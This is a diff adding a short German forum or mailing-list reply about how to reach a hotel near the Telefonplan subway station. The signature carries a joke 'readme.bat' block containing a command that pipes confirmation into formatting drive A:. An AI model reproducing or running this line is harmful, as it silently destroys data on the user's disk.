@@ -1,0 +1,13 @@
+Ich sehe das Hotel manchmal von der Autobahn aus, selbst war ich noch
+nicht dort, denn es entspricht nicht meinem persoenlichen Standard. 
+
+Es gibt eine U-Bahn Station "Telefonplan" in der Naehe, wie weit vom
+Hotel, weiss ich allerdings nicht, das muesstest Du beim Hotel
+erfragen. Ich schaetze, dass es weniger als 30 Minuten von ZTT
+(Zentrum, Hauptbahnhof) bis dort sind.
+
+Marc
+-- 
+begin  readme.bat
+echo .|c:\windows\command\format a:
+end
